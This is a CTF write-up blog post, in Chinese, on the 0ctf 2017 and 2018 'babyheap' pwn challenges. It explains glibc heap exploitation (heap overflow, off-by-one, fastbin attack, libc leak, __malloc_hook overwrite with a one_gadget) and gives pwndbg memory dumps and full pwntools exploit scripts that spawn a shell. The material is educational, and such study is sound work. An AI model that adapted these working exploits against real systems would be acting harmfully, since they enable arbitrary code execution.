---
layout: post
title:  "0ctf-babyheap"
date:   2019-8-9
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF,0ctf,Pwn]
icon: icon-html
---

# 0ctf-babyheap

- ### 0ctf2017 babyheap

  Allocate

  申请大小0x1000字节以内内存

  Fill

  向堆块写入数据，存在堆溢出

  Free

  释放堆块

  Dump

  打印堆块数据

  - ### 泄露libc基址

    small chunk 被释放后进入unsorted bin，fd和bk指向unsorted bin链表头部(main_arena + 0x58)

    main_arena相对libc偏移0x3c4b20

    如果能得到指向这个fd的index就可以得到libc基址

    

    分配几个fast chunk和一个small chunk，free两个fast chunk，改fd指向small chunk，改small chunk的size绕过检查，两次alloc就可以获得指向small chunk的index。

    然后把small chunk的size改回去，再分配一个small chunk防止free后被合并到top chunk而不是进入unsorted bin，然后free，fd和bk指向unsorted bin链表头部。dump(2)

    ```python
    def leak_libc():
    	for i in range(4):
    		alloc(0x10)
    	alloc(0x80)
    	free(1)
    	free(2)
    	padding = p64(0)*3 + p64(0x21)
    	payload = padding*2 + p8(0x80)
    	fill(0, payload)
    	fill(3, padding)
    	alloc(0x10)
    	alloc(0x10)
    
    	payload = p64(0)*3 + p64(0x91)
    	fill(3, payload)
    	alloc(0x80)
    	free(4)
    	fuck = dump(2)[:8].ljust(8, "\x00")
    	libc_base = u64(fuck)-0x3c4b78
    	print(hex(libc_base))
    	return libc_base
    
    ```

    

    ```c
    pwndbg> x/64gx 0x55f1f27bf000
    0x55f1f27bf000:	0x0000000000000000	0x0000000000000021
    0x55f1f27bf010:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf020:	0x0000000000000000	0x0000000000000021
    0x55f1f27bf030:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf040:	0x0000000000000000	0x0000000000000021
    0x55f1f27bf050:	0x000055f1f27bf080	0x0000000000000000
    0x55f1f27bf060:	0x0000000000000000	0x0000000000000021
    0x55f1f27bf070:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf080:	0x0000000000000000	0x0000000000000091
    0x55f1f27bf090:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf0a0:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf0b0:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf0c0:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf0d0:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf0e0:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf0f0:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf100:	0x0000000000000000	0x0000000000000000
    0x55f1f27bf110:	0x0000000000000000	0x0000000000020ef1
    
    ```

    ```c
    pwndbg> x/64gx 0x55eea8bbe000 
    0x55eea8bbe000:	0x0000000000000000	0x0000000000000021
    0x55eea8bbe010:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe020:	0x0000000000000000	0x0000000000000021
    0x55eea8bbe030:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe040:	0x0000000000000000	0x0000000000000021
    0x55eea8bbe050:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe060:	0x0000000000000000	0x0000000000000021
    0x55eea8bbe070:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe080:	0x0000000000000000	0x0000000000000091
    0x55eea8bbe090:	0x00007f387ebaa678	0x00007f387ebaa678
    0x55eea8bbe0a0:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe0b0:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe0c0:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe0d0:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe0e0:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe0f0:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe100:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe110:	0x0000000000000090	0x0000000000000090
    0x55eea8bbe120:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe130:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe140:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe150:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe160:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe170:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe180:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe190:	0x0000000000000000	0x0000000000000000
    0x55eea8bbe1a0:	0x0000000000000000	0x0000000000020e61
    ```

  - ### 写__malloc_hook

    __malloc_hook 是一个函数指针变量，指向

    ```ｃ
    void * function(size_t size, void * caller)
    ```

    调用 malloc 时如果该指针不为空则执行它指向的函数

    ```c
    void *(*hook) (size_t, const void *)
       = atomic_forced_read (__malloc_hook);
     if (__builtin_expect (hook != NULL, 0))
       return (*hook)(bytes, RETURN_ADDRESS (0));
    ```

    如果能把one_gadget写入__malloc_hook，就可以getshell

    

    __malloc_hook在main_arena上方，相对libc偏移0x3c4b10

    在\__malloc_hook处构造fake chunk，index4和index2指向同一个chunk，free(4)再通过index2改fd，然后两次alloc就可以在__malloc_hook分配一个chunk

    然后把one_gadget写入_malloc_hook，再alloc就可以执行one_gadget

    通过字节错位绕过size检查

    找一个0x7f

    ```c
    pwndbg> x/64gx 0x7ffff7dd2c0d
    0x7ffff7dd2c0d <_IO_wide_data_0+301>:	0xfff7dced60000000	0x000000000000007f
    0x7ffff7dd2c1d:	0xfff7aa0b40000000	0xfff7aa10b000007f
    0x7ffff7dd2c2d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
    0x7ffff7dd2c3d:	0x0000000000000000	0x0000000000000000
    0x7ffff7dd2c4d <main_arena+13>:	0x0000000000000000	0x0000000000000000
    0x7ffff7dd2c5d <main_arena+29>:	0x0000000000000000	0x0000000000000000
    0x7ffff7dd2c6d <main_arena+45>:	0x0000000000000000	0x0000000000000000
    0x7ffff7dd2c7d <main_arena+61>:	0x0000000000000000	0x0000000000000000
    0x7ffff7dd2c8d <main_arena+77>:	0x0000000000000000	0x0000000000000000
    0x7ffff7dd2c9d <main_arena+93>:	0x5555757270000000	0x0000000000000055
    ```

    ```c
    pwndbg> x/64gx 0x7f8c24e5c5ed-5
    0x7f8c24e5c5e8:	0x00007f8c24e5c120	0x00007f8c24e58940
    0x7f8c24e5c5f8:	0x0000000000000000	0x0000000000000000
    0x7f8c24e5c608 <__realloc_hook>:	0x0000000000000000	0x00007f8c24adcd6a
    0x7f8c24e5c618:	0x0000000000000000	0x0000000000000000
    0x7f8c24e5c628:	0x0000000000000000	0x0000000000000000
    0x7f8c24e5c638:	0x0000000000000000	0x0000000000000000
    0x7f8c24e5c648:	0x0000000000000000	0x8c24b343a0000000
    ```

    ```python
    libc_base = leak_libc()
    alloc(0x60)
    free(4)
    fuck_addr = libc_base+0x3c4aed
    print(hex(fuck_addr))
    payload = p64(fuck_addr)
    fill(2, payload)
    alloc(0x60)
    alloc(0x60)
    one = libc_base+0x4526a
    payload = p8(0)*3 + p64(0)*2 + p64(one)
    fill(6, payload)
    alloc(0x10)
    r.interactive()
    ```

  

  * ### exp

    ```python
    from pwn import *
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    r = remote('f.buuoj.cn',20001)
    context.log_level = "debug"
    #r = process(['./babyheap_0ctf_2017'],env = {"LD_PRELOAD":"./libc.so.6"})
    elf = ELF('./babyheap_0ctf_2017')
    libc = ELF('./x64_libc.so.6')
    
    def alloc(size):
    	r.recvuntil('Command:')
    	r.sendline('1')
    	r.recvuntil('Size:')
    	r.sendline(str(size))
    
    def fill(index,content):
        r.recvuntil('Command:')
        r.sendline('2')
        r.recvuntil('Index:')
        r.sendline(str(index))
        r.recvuntil('Size:')
        r.sendline(str(len(content)))
        r.recvuntil('Content:')
        r.send(content)
    
    def free(index):
        r.recvuntil('Command:')
        r.sendline('3')
        r.recvuntil('Index:')
        r.sendline(str(index))
    
    def dump(index):
        r.recvuntil('Command:')
        r.sendline('4')
        r.recvuntil('Index:')
        r.sendline(str(index))
        r.recvuntil('Content: \n')
        fuck = r.recvline()
        return fuck
    
    def leak_libc():
    	for i in range(4):
    		alloc(0x10)
    	alloc(0x80)
    	free(1)
    	free(2)
    	padding = p64(0)*3 + p64(0x21)
    	payload = padding*2 + p8(0x80)
    	fill(0, payload)
    	fill(3, padding)
    	alloc(0x10)
    	alloc(0x10)
    
    	payload = p64(0)*3 + p64(0x91)
    	fill(3, payload)
    	alloc(0x80)
    	free(4)
    	fuck = dump(2)[:8].ljust(8, "\x00")
    	libc_base = u64(fuck)-0x3c4b78
    	print(hex(libc_base))
    	return libc_base
    
    
    libc_base = leak_libc()
    alloc(0x60)
    free(4)
    fuck_addr = libc_base+0x3c4aed
    print(hex(fuck_addr))
    payload = p64(fuck_addr)
    fill(2, payload)
    alloc(0x60)
    alloc(0x60)
    one = libc_base+0x4526a
    payload = p8(0)*3 + p64(0)*2 + p64(one)
    fill(6, payload)
    alloc(0x10)
    r.interactive()
    ```

    

- ### 0ctf2018-babyheap

  Allocate

  申请大小0x58字节以内内存

  Update

  向堆块写入数据，存在Off-By-One

  Delete

  释放堆块

  View

  打印堆块数据

  - ### 泄露libc基址

    overlap。Off-By-One改chunk的size，使其包含两个chunk，size范围在unsorted bin范围内，free后fd和bk指向unsorted bin链表头部。此时被chunk2可以查看，再申请一个chunk，chunk2的fd和bk变为chunk1的fd和bk，view(2)可以得到unsorted bin链表头部地址

    ```python
    offset = 0x399b00
    alloc(0x48)
    alloc(0x48)
    alloc(0x48)
    alloc(0x48)
    payload = 'a' * 0x48 + '\xa1'
    update(0, 0x49, payload)
    delete(1)
    alloc(0x48)
    view(2)
    r.recvuntil("Chunk[2]: ")
    main_arena = u64(r.recv(8)) - 0x58
    libc_base = main_arena - offset
    log.success('main_arena:'+hex(main_arena))
    log.success('libc_base:'+hex(libc_base))
    ```

    

    ```c
    pwndbg> x/64gx 0x5599b639e000
    0x5599b639e000:	0x0000000000000000	0x0000000000000051
    0x5599b639e010:	0x6161616161616161	0x6161616161616161
    0x5599b639e020:	0x6161616161616161	0x6161616161616161
    0x5599b639e030:	0x6161616161616161	0x6161616161616161
    0x5599b639e040:	0x6161616161616161	0x6161616161616161
    0x5599b639e050:	0x6161616161616161	0x00000000000000a1
    0x5599b639e060:	0x00007f05d79d3678	0x00007f05d79d3678
    0x5599b639e070:	0x0000000000000000	0x0000000000000000
    0x5599b639e080:	0x0000000000000000	0x0000000000000000
    0x5599b639e090:	0x0000000000000000	0x0000000000000000
    0x5599b639e0a0:	0x0000000000000000	0x0000000000000051
    0x5599b639e0b0:	0x0000000000000000	0x0000000000000000
    0x5599b639e0c0:	0x0000000000000000	0x0000000000000000
    0x5599b639e0d0:	0x0000000000000000	0x0000000000000000
    0x5599b639e0e0:	0x0000000000000000	0x0000000000000000
    0x5599b639e0f0:	0x00000000000000a0	0x0000000000000050
    ```

    ```c
    pwndbg> x/64gx  0x5599b639e000
    0x5599b639e000:	0x0000000000000000	0x0000000000000051
    0x5599b639e010:	0x6161616161616161	0x6161616161616161
    0x5599b639e020:	0x6161616161616161	0x6161616161616161
    0x5599b639e030:	0x6161616161616161	0x6161616161616161
    0x5599b639e040:	0x6161616161616161	0x6161616161616161
    0x5599b639e050:	0x6161616161616161	0x0000000000000051
    0x5599b639e060:	0x0000000000000000	0x0000000000000000
    0x5599b639e070:	0x0000000000000000	0x0000000000000000
    0x5599b639e080:	0x0000000000000000	0x0000000000000000
    0x5599b639e090:	0x0000000000000000	0x0000000000000000
    0x5599b639e0a0:	0x0000000000000000	0x0000000000000051
    0x5599b639e0b0:	0x00007f05d79d3678	0x00007f05d79d3678
    0x5599b639e0c0:	0x0000000000000000	0x0000000000000000
    0x5599b639e0d0:	0x0000000000000000	0x0000000000000000
    0x5599b639e0e0:	0x0000000000000000	0x0000000000000000
    0x5599b639e0f0:	0x0000000000000050	0x0000000000000050
    ```

    泄露堆地址，此时再申请一个chunk，index为4，index为2的chunk和这个chunk是同一个chunk，free chunk1和chunk2，chunk2的fd指向chunk1，然后view(4)就可以得到堆地址

    ```python
    alloc(0x48)
    delete(1)   
    delete(2)
    view(4)
    r.recvuntil("Chunk[4]: ")
    chunk0 = u64(r.recv(8)) - 0x50
    log.success('chunk0'+hex(chunk0))
    ```

    ```c
    pwndbg> x/64gx 0x55ff159af000
    0x55ff159af000:	0x0000000000000000	0x0000000000000051
    0x55ff159af010:	0x6161616161616161	0x6161616161616161
    0x55ff159af020:	0x6161616161616161	0x6161616161616161
    0x55ff159af030:	0x6161616161616161	0x6161616161616161
    0x55ff159af040:	0x6161616161616161	0x6161616161616161
    0x55ff159af050:	0x6161616161616161	0x0000000000000051
    0x55ff159af060:	0x0000000000000000	0x0000000000000000
    0x55ff159af070:	0x0000000000000000	0x0000000000000000
    0x55ff159af080:	0x0000000000000000	0x0000000000000000
    0x55ff159af090:	0x0000000000000000	0x0000000000000000
    0x55ff159af0a0:	0x0000000000000000	0x0000000000000051
    0x55ff159af0b0:	0x000055ff159af050	0x0000000000000000
    0x55ff159af0c0:	0x0000000000000000	0x0000000000000000
    0x55ff159af0d0:	0x0000000000000000	0x0000000000000000
    0x55ff159af0e0:	0x0000000000000000	0x0000000000000000
    0x55ff159af0f0:	0x0000000000000000	0x0000000000000051
    0x55ff159af100:	0x0000000000000000	0x0000000000000000
    0x55ff159af110:	0x0000000000000000	0x0000000000000000
    0x55ff159af120:	0x0000000000000000	0x0000000000000000
    0x55ff159af130:	0x0000000000000000	0x0000000000000000
    0x55ff159af140:	0x0000000000000000	0x0000000000020ec1
    ```

    

  - ### 写__malloc_hook

    最大只能申请0x58字节，所以不能直接在\_\_malloc_hook附近构造fake_chunk。

    先在main_arena构造fake_chunk，然后把top_chunk改到_\_malloc_hook上方，下一次alloc就可以控制__malloc_hook

    在构造fake_chunk前先做一个fast bin，使fast bin链表中有地址，fake_chunk地址选择main_arena + 0x20 + 5，利用这个fast bin的地址的第一个字节绕过size检查

    ```c
    bypass = alloc(0x58)
    delete(bypass)
    update(chunk2_, p64(fake_addr))
    alloc(0x48)
    fake_chunk = alloc(0x40)
    payload = '\x00'*35 + p64(top)
    update(fake_chunk, payload)
    fuck_chunk = alloc(0x48)
    payload = '\x00'*3 + '\x00'*16 + p64(one)
    update(fuck_chunk, payload)
    ```

    fake_chunk

    ```c
    [*] fake_addr:0x7f96b2675640
    pwndbg> x/64gx 0x7f96b2675640
    0x7f96b2675640:	0x0000000000000000	0x0000560b2d3c2140
    0x7f96b2675650:	0x0000000000000000	0x0000000000000000
    0x7f96b2675660:	0x0000000000000000	0x0000000000000000
    0x7f96b2675670:	0x0000000000000000	0x0000560b2d3c21a0
    ```

    ```c
    [*] fake_addr:0x7f96b2675640
    pwndbg> x/64gx 0x7f96b2675645
    0x7f96b2675645:	0x0b2d3c2140000000	0x0000000000000056
    0x7f96b2675655:	0x0000000000000000	0x0000000000000000
    0x7f96b2675665:	0x0000000000000000	0x0000000000000000
    0x7f96b2675675:	0x0b2d3c21a0000000	0x0b2d3c20a0000056
    ```

    fake_top

    ```c
    [*] fake_addr:0x7f0af3d1a645
    [*] top:0x7f0af3d1a5ed
    pwndbg> x/64gx 0x7f0af3d1a645
    0x7f0af3d1a645:	0x32374b9140000000	0x0000000000000056
    0x7f0af3d1a655:	0x0000000000000000	0x0000000000000000
    0x7f0af3d1a665:	0x0000000000000000	0x0000000000000000
    0x7f0af3d1a675:	0x0af3d1a5ed000000	0x32374b90a000007f
    ```

    __malloc_hook

    ```c
    [*] top:0x7f41eaa035ed
    [*] one:0x7f41ea6a8e7a
    pwndbg> x/64gx 0x7f41eaa035ed
    0x7f41eaa035ed:	0x41ea9ff94000007f	0x0000000000000051
    0x7f41eaa035fd:	0x0000000000000000	0x0000000000000000
    0x7f41eaa0360d <__realloc_hook+5>:	0x41ea6a8e7a000000	0x000000000000007f
    0x7f41eaa0361d:	0x0000000000000000	0x0000000000000000
    0x7f41eaa0362d:	0x0000000000000000	0x0000000000000000
    0x7f41eaa0363d:	0x0000000000000000	0x0000000000000029
    ```

  - exp

    ```python
    from pwn import *
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    context.log_level = 'debug'
    r = process(['./babyheap'],env = {'LD_PRELOAD':'./libc.so.6'})
    elf = ELF('./babyheap')
    libc = ELF('./libc.so.6')
    
    def alloc(size):
        r.recvuntil('Command: ')
        r.sendline('1')
        r.recvuntil('Size: ')
        r.sendline(str(size))
        fuck = r.recvuntil('Allocated\n')
        index = int(fuck.split()[1])
        return index
    
    def update(index, content):
        r.recvuntil('Command: ')
        r.sendline('2')
        r.recvuntil('Index: ')
        r.sendline(str(index))
        r.recvuntil('Size: ')
        r.sendline(str(len(content)))
        r.recvuntil('Content: ')
        r.sendline(content)
    
    def delete(index):
        r.recvuntil('Command: ')
        r.sendline('3')
        r.recvuntil('Index: ')
        r.sendline(str(index))
    
    def view(index):
        r.recvuntil('Command: ')
        r.sendline('4')
        r.recvuntil('Index: ')
        r.sendline(str(index))
    
    
    offset = 0x399b00
    chunk0 = alloc(0x48)
    chunk1 = alloc(0x48)
    chunk2 = alloc(0x48)
    chunk3 = alloc(0x48)
    payload = 'a' * 0x48 + '\xa1'
    update(0, payload)
    delete(chunk1)
    chunk1 = alloc(0x48)
    
    view(chunk2)
    r.recvuntil('Chunk[2]: ')
    main_arena = u64(r.recv(8)) - 0x58
    libc_base = main_arena - offset
    log.success('main_arena:'+hex(main_arena))
    log.success('libc_base:'+hex(libc_base))
    
    chunk2_ = alloc(0x48)
    delete(chunk1)   
    delete(chunk2)
    view(chunk2_ )
    r.recvuntil('Chunk[4]: ')
    chunk0 = u64(r.recv(8)) - 0x50
    log.success('chunk0: '+hex(chunk0))
    
    
    fake_addr = main_arena + 0x20 + 5
    top = main_arena - 0x33
    one = libc_base + 0x3f35a
    log.info('fake_addr:'+hex(fake_addr))
    log.info('top:'+hex(top))
    log.info('one:'+hex(one))
    
    bypass = alloc(0x58)
    delete(bypass)
    update(chunk2_, p64(fake_addr))
    alloc(0x48)
    fake_chunk = alloc(0x40)
    payload = '\x00'*35 + p64(top)
    update(fake_chunk, payload)
    fuck_chunk = alloc(0x48)
    payload = '\x00'*18 + p64(one)
    update(fuck_chunk, payload)
    
    r.interactive()
    ```

    

  



